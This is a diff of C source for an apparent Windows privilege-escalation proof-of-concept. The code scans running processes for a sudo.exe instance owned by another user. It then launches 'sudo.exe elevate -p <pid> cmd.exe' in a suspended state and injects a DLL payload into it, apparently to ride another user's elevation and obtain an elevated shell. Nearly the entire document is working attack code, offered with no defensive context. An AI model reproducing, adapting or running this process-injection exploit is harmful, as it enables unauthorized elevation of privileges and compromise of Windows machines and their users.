@@ -1,14 +1,17 @@
 #include <Windows.h>
 #include <psapi.h>
 #include <stdio.h>
-#include <tlhelp32.h>
+#include <Lmcons.h>
+
 
 static HANDLE inject_dll(HANDLE processHandle, char dllName[]);
-static HANDLE spawn_target(char*, char*);
-static HANDLE find_sudo_target();
+static HANDLE spawn_target(char*);
 DWORD FindRunningSudo();
 char defaultPayload[] = "C:\\sudo-dll-payload.dll";
-const char* kSudoFile = "sudo.exe";
+const char* kSudoFile = "C:\\Windows\\System32\\sudo.exe";
+const char* kSudoCmdLineFormat = "sudo.exe elevate -p %u cmd.exe";
+
+char g_CurrentUser[UNLEN];
 
 
 /*
@@ -24,8 +27,10 @@ int main(int argc, char **argv) {
 	}
 
 	printf("Going to inject %s into a controlled process to run '%s'\n", payload, argv[1]);
+	DWORD szCurrentUserLen = UNLEN;
+	GetUserName(g_CurrentUser, &szCurrentUserLen);
 
-	HANDLE controlled_process = spawn_target(argv[1], payload);
+	HANDLE controlled_process = spawn_target(payload);
 	WaitForSingleObject(controlled_process, INFINITE);
 }
 
@@ -65,12 +70,20 @@ static HANDLE inject_dll(HANDLE proccessHandle, char dllName[]) {
 }
 
 
-static HANDLE spawn_target(char *cmd_to_run, char *path_to_payload) {
+static HANDLE spawn_target(char *path_to_payload) {
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
+	DWORD dwTargetPid = NULL;
+	char szTargetCmdLine[256];
 
 	si.cb = sizeof(si);
-	HRESULT createProcessResult = CreateProcessA("C:\\Windows\\System32\\sudo.exe", cmd_to_run, 0, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	while (dwTargetPid == NULL) {
+		dwTargetPid = FindRunningSudo();
+	}
+	snprintf(szTargetCmdLine, 256, kSudoCmdLineFormat, dwTargetPid);
+	printf("Running '%s'\n", szTargetCmdLine);
+
+	HRESULT createProcessResult = CreateProcessA(kSudoFile, szTargetCmdLine, 0, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	if (createProcessResult == 0) {
 		printf("Creating the target failed.\n");
 		return FALSE;
@@ -86,4 +99,56 @@ static HANDLE spawn_target(char *cmd_to_run, char *path_to_payload) {
 
 	ResumeThread(pi.hThread);
 	return pi.hProcess;
+}
+
+DWORD FindRunningSudo() {
+	DWORD aProcesses[1024], cbNeeded, cProcesses;
+	unsigned int i;
+
+	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
+	{
+		return NULL;
+	}
+
+
+	// Calculate how many process identifiers were returned.
+
+	cProcesses = cbNeeded / sizeof(DWORD);
+
+	// Print the name and process identifier for each process.
+
+	for (i = 0; i < cProcesses; i++)
+	{
+		if (aProcesses[i] != 0)
+		{
+			HANDLE proccesHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, aProcesses[i]);
+			if (NULL != proccesHandle)
+			{
+				HANDLE hProcessToken = NULL;
+				char lpName[260];
+				char lpDomain[260];
+				if (OpenProcessToken(proccesHandle, TOKEN_QUERY, &hProcessToken)) {
+					DWORD dwSize = 128;
+					PTOKEN_USER ptu = (TOKEN_USER*)LocalAlloc(LMEM_FIXED, dwSize);
+					if (GetTokenInformation(hProcessToken, TokenUser, ptu, dwSize, &dwSize)) {
+						SID_NAME_USE SidType;
+						if (LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType)) {
+							if (strcmp(lpName, g_CurrentUser) == 0) {
+								continue;
+							}
+						}
+					}
+				}
+
+				char szProcessName[MAX_PATH] = "<unknown>";
+				DWORD dwLen = MAX_PATH;
+				QueryFullProcessImageNameA(proccesHandle, 0, szProcessName, &dwLen);
+				if (strcmp(szProcessName, "C:\\Windows\\System32\\sudo.exe") == 0) {
+					printf("Found target sudo proccess %i\n", aProcesses[i]);
+					return aProcesses[i];
+				}
+			}
+		}
+	}
+	return NULL;
 }
